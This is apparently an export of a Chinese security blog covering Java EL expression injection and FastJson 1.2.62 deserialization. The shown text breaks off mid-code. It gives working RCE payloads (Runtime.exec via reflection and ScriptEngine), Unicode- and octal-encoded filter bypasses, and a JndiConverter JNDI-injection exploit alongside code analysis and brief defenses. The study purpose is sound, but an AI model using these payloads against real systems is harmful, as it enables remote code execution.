<p><img src="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740319136298-9186af5c-ffcc-4abf-8c85-ea48d8692b3e.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2025/png/44744277/1740319136298-9186af5c-ffcc-4abf-8c85-ea48d8692b3e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="IdSDB">EL表达式的EXP与基础绕过</h2>
<h3 id="XsqTV">基础EXP</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;&#x27;</span>.getClass()).invoke(<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethod(<span class="string">&#x27;getRuntime&#x27;</span>).invoke(<span class="literal">null</span>),<span class="string">&#x27;calc.exe&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Pqy5s">利用 ScriptEngine 调用 JS 引擎绕过</h3>
引用drun1baby师傅的博客

<blockquote>
<p><font style="color:rgb(80, 80, 92);">EL 曾经是</font><font style="color:rgb(80, 80, 92);"> </font><code>JSTL</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">的一部分。然后，EL 进入了 JSP 2.0 标准。现在，尽管是 JSP 2.1 的一部分，但 EL API 已被分离到包</font><font style="color:rgb(80, 80, 92);"> </font><code>javax.el</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">中， 并且已删除了对核心 JSP 类的所有依赖关系。换句话说：EL 已准备好在非 JSP 应用程序中使用！</font></p>
<p><font style="color:rgb(80, 80, 92);">也就是说，现在 EL 表达式所依赖的包</font><font style="color:rgb(80, 80, 92);"> </font><code>javax.el</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">等都在</font><font style="color:rgb(80, 80, 92);"> </font><code>JUEL</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">相关的 jar 包中。</font></p>
<p><font style="color:rgb(80, 80, 92);">JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。</font></p>
<p><font style="color:rgb(80, 80, 92);">需要的 jar 包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7</font></p>
</blockquote>
<p>在pom.xml中导入依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;juel-impl&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.7</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;juel-api&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.7</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;de.odysseus.juel&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;juel-spi&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">2.2</span><span class="number">.7</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>运行后，通过反射调用<code>Runtime</code>类，成功执行恶意代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> drunkbaby.basicelvul;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> de.odysseus.el.ExpressionFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> de.odysseus.el.util.SimpleContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.el.ExpressionFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.el.ValueExpression;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScriptEngineExec</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">ExpressionFactory</span> <span class="variable">expressionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExpressionFactoryImpl</span>();  </span><br><span class="line">        <span class="type">SimpleContext</span> <span class="variable">simpleContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleContext</span>();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;$&#123;&#x27;&#x27;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;Calc.exe&#x27;)\&quot;)&#125;\n&quot;</span> +  <span class="string">&quot; &quot;</span>;  </span><br><span class="line">        <span class="type">ValueExpression</span> <span class="variable">valueExpression</span> <span class="operator">=</span> expressionFactory.createValueExpression(simpleContext, exp, String.class);  </span><br><span class="line">        valueExpression.getValue(simpleContext);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="BYc3S">利用 Unicode 编码绕过</h3>
对可利用的poc进行全部或者部分的Unicode编码都是可以的

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Unicode编码内容为前面反射调用的PoC</span></span><br><span class="line">\u0024\u007b\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0065\u0078\u0065\u0063\u0027\u002c\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006e\u0075\u006c\u006c\u0029\u002c\u0027\u0063\u0061\u006c\u0063\u002e\u0065\u0078\u0065\u0027\u0029\u007d</span><br></pre></td></tr></table></figure>

<h3 id="QLpyH">利用八进制编码绕过</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 八进制编码内容为前面反射调用的PoC</span></span><br><span class="line">\<span class="number">44</span>\<span class="number">173</span>\<span class="number">47</span>\<span class="number">47</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">103</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">50</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">146</span>\<span class="number">157</span>\<span class="number">162</span>\<span class="number">116</span>\<span class="number">141</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">152</span>\<span class="number">141</span>\<span class="number">166</span>\<span class="number">141</span>\<span class="number">56</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">156</span>\<span class="number">147</span>\<span class="number">56</span>\<span class="number">122</span>\<span class="number">165</span>\<span class="number">156</span>\<span class="number">164</span>\<span class="number">151</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">47</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">115</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">150</span>\<span class="number">157</span>\<span class="number">144</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">145</span>\<span class="number">170</span>\<span class="number">145</span>\<span class="number">143</span>\<span class="number">47</span>\<span class="number">54</span>\<span class="number">47</span>\<span class="number">47</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">103</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">50</span>\<span class="number">51</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">151</span>\<span class="number">156</span>\<span class="number">166</span>\<span class="number">157</span>\<span class="number">153</span>\<span class="number">145</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">47</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">103</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">163</span>\<span class="number">163</span>\<span class="number">50</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">146</span>\<span class="number">157</span>\<span class="number">162</span>\<span class="number">116</span>\<span class="number">141</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">152</span>\<span class="number">141</span>\<span class="number">166</span>\<span class="number">141</span>\<span class="number">56</span>\<span class="number">154</span>\<span class="number">141</span>\<span class="number">156</span>\<span class="number">147</span>\<span class="number">56</span>\<span class="number">122</span>\<span class="number">165</span>\<span class="number">156</span>\<span class="number">164</span>\<span class="number">151</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">47</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">115</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">150</span>\<span class="number">157</span>\<span class="number">144</span>\<span class="number">50</span>\<span class="number">47</span>\<span class="number">147</span>\<span class="number">145</span>\<span class="number">164</span>\<span class="number">122</span>\<span class="number">165</span>\<span class="number">156</span>\<span class="number">164</span>\<span class="number">151</span>\<span class="number">155</span>\<span class="number">145</span>\<span class="number">47</span>\<span class="number">51</span>\<span class="number">56</span>\<span class="number">151</span>\<span class="number">156</span>\<span class="number">166</span>\<span class="number">157</span>\<span class="number">153</span>\<span class="number">145</span>\<span class="number">50</span>\<span class="number">156</span>\<span class="number">165</span>\<span class="number">154</span>\<span class="number">154</span>\<span class="number">51</span>\<span class="number">54</span>\<span class="number">47</span>\<span class="number">143</span>\<span class="number">141</span>\<span class="number">154</span>\<span class="number">143</span>\<span class="number">56</span>\<span class="number">145</span>\<span class="number">170</span>\<span class="number">145</span>\<span class="number">47</span>\<span class="number">51</span>\<span class="number">175</span></span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(80, 80, 92);">JohnFord </font>编码脚本如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">str = <span class="string">&quot;$&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass()).invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null),&#x27;calc.exe&#x27;)&#125;&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> s in str:</span><br><span class="line">  num = <span class="string">&quot;\\&quot;</span> + oct(ord(s))</span><br><span class="line">  result += num</span><br><span class="line"><span class="title function_">print</span><span class="params">(result.replace(<span class="string">&quot;\\0&quot;</span>, <span class="string">&quot;\\&quot;</span>)</span>)</span><br></pre></td></tr></table></figure>

<h2 id="OILfV">防御方法</h2>

<ul>
<li>尽量不使用外部输入的内容作为EL表达式的内容</li>
<li>若使用，严格过滤EL表达式注入漏洞payload关键字</li>
<li>如果是排查Java程序中JURL相关代码，则搜索如下关键类方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.el.ExpressionFactory.createValueExpression()</span><br><span class="line">javax.el.ValueExpression.getValue()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>表达式注入</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson 1.2.62-1.2.68反序列化漏洞</title>
    <url>/2025/03/24/FastJson1-2-62-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="mxJnr">FastJson 1.2.62-1.2.68反序列化漏洞</h1>
今天学习一下FastJson 中 1.2.62 - 1.2.68 的反序列化漏洞，思路的话和之前一样基于黑名单的绕过，但是大部分还是在 AutoType 开启的情况下，且基本都基于存在其他的依赖的条件下

<h2 id="Otftt">1.2.62 反序列化漏洞</h2>
<h3 id="evyuq">1.2.62 反序列化前提条件</h3>

<ul>
<li>需要开启AutoType</li>
<li>FastJson &lt;&#x3D; 1.2.62 </li>
<li>JNDI注入可利用的 JDK 版本</li>
<li>目标服务端需要存在xbean-reflect包，xbean-reflect 包的版本不限</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">         &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  </span><br><span class="line">         &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  </span><br><span class="line">         &lt;version&gt;<span class="number">1.2</span><span class="number">.62</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">         &lt;groupId&gt;org.apache.xbean&lt;/groupId&gt;  </span><br><span class="line">         &lt;artifactId&gt;xbean-reflect&lt;/artifactId&gt;  </span><br><span class="line">         &lt;version&gt;<span class="number">4.18</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;  </span><br><span class="line">    &lt;dependency&gt;  </span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<h3 id="GJ9xD">漏洞原理分析</h3>
<h4 id="cg9NB">逆向分析</h4>

<p>漏洞存在在<code>org.apache.xbean.propertyeditor.JndiConverter</code>中的<code>toObjectImpl</code>方法中</p>
<p>但是他不是一个setter或者getter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">toObjectImpl</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="keyword">return</span> (Context) context.lookup(text);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyEditorException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>向上找，在<code>AbstractConverter#toObject</code>中调用了该方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">toObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObjectImpl((trim) ? text.trim() : text);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续找的话，我们找到了一个getter方法和一个setter方法，但似乎这个getter方法并不是一个满足条件的getter方法（无参数），因此我们可以看<code>AbstractConverter</code>中的<code>setAsTest</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741924052265-b71c177a-68c1-4b2a-9b69-1a9b113c5024.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741924052265-b71c177a-68c1-4b2a-9b69-1a9b113c5024.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>其中<code>setAsTest</code>方法源码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setAsText</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObject((trim) ? text.trim() : text);</span><br><span class="line">        <span class="built_in">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="vaUmG">正向分析</h4>

<p>当我们调用<code>JndiConverter</code>的<code>setAsText</code>方法时，它本身没有该方法，就会调用父类的<code>setAsText</code></p>
<p>方法，他的父类正好是<code>AbstractConverter</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiConverter</span> <span class="keyword">extends</span> <span class="title class_">AbstractConverter</span></span><br></pre></td></tr></table></figure>

<p>这里会调用<code>toObject</code>方法，该方法调用<code>toObject</code>方法，最后<code>toObject</code>调用<code>toObjectImpl</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">setAsText</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObject((trim) ? text.trim() : text);</span><br><span class="line">        <span class="built_in">super</span>.setValue(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">toObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> toObjectImpl((trim) ? text.trim() : text);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>AbstractConverter</code>中没有<code>toObjectImpl</code>，所以这里调用到<code>JndiConverter</code>的<code>toObjectImpl</code>方法，就触发了JNDI注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">toObjectImpl</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="keyword">return</span> (Context) context.lookup(text);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PropertyEditorException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="k71ri">EXP编写</h3>
EXP如下，记得要开启AutoType哟

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;asText\&quot;:\&quot;ldap://127.0.0.1:8085/JlaYFplQ\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>运行后</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741925535544-0ab2c0da-6f61-4042-a6a9-7fcb37bfe8b0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741925535544-0ab2c0da-6f61-4042-a6a9-7fcb37bfe8b0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="mhCJS">调试分析</h3>

<p>我们进入<code>CheckAutoType</code>中，对里面的一些过滤进行以下分析，有以下几个新的限制</p>
<ul>
<li><code>@type</code>类名长度</li>
<li>expectClass参数的类型匹配</li>
<li><code>[</code>检测</li>
<li><code>L</code>检测</li>
<li><code>LL</code>检测</li>
<li>通过计算hash与白名单进行匹配</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 限制了JSON中@type指定的类名长度</span></span><br><span class="line">      <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">192</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 单独对expectClass参数进行判断，设置expectClassFlag的值</span></span><br><span class="line"><span class="comment">// 当且仅当expectClass参数不为空且不为Object、Serializable、...等类类型时expectClassFlag才为true</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">boolean</span> expectClassFlag;</span><br><span class="line">      <span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">          expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (expectClass == Object.class</span><br><span class="line">                  || expectClass == Serializable.class</span><br><span class="line">                  || expectClass == Cloneable.class</span><br><span class="line">                  || expectClass == Closeable.class</span><br><span class="line">                  || expectClass == EventListener.class</span><br><span class="line">                  || expectClass == Iterable.class</span><br><span class="line">                  || expectClass == Collection.class</span><br><span class="line">                  ) &#123;</span><br><span class="line">              expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">      Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.43检测，&quot;[&quot;</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line">      <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// [</span></span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.41检测，&quot;Lxx;&quot;</span></span><br><span class="line">      <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">      &#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 1.2.42检测，&quot;LL&quot;</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">              * PRIME)</span><br><span class="line">              ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">              * PRIME;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 对类名进行Hash计算并查找该值是否在INTERNAL_WHITELIST_HASHCODES即内部白名单中，若在则internalWhite为true</span></span><br><span class="line">      <span class="type">boolean</span> <span class="variable">internalWhite</span> <span class="operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,</span><br><span class="line">              TypeUtils.fnv1a_64(className)</span><br><span class="line">      ) &gt;= <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>继续向下，internalWhite为false , 当我们开启autoTypeSupport时，就会走入下面的逻辑</p>
<p>首先通过hash进行白名单匹配，后续进行黑名单过滤</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!internalWhite &amp;&amp; (<span class="built_in">this</span>.autoTypeSupport || expectClassFlag)) &#123;</span><br><span class="line">                hash = h3;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">                    hash ^= (<span class="type">long</span>)className.charAt(mask);</span><br><span class="line">                    hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">true</span>);</span><br><span class="line">                        <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">return</span> clazz;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>因为并没有被黑名单过滤，所以我们走到了这里</p>
<p><code>autoTypeSupport</code>为true，因此我们不会走到if代码中并抛出异常，而是会走出if判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">this</span>.autoTypeSupport) &#123;</span><br><span class="line">                hash = h3;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(mask = <span class="number">3</span>; mask &lt; className.length(); ++mask) &#123;</span><br><span class="line">                    <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> className.charAt(mask);</span><br><span class="line">                    hash ^= (<span class="type">long</span>)c;</span><br><span class="line">                    hash *= <span class="number">1099511628211L</span>;</span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (Arrays.binarySearch(<span class="built_in">this</span>.acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">                            clazz = TypeUtils.loadClass(typeName, <span class="built_in">this</span>.defaultClassLoader, <span class="literal">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> 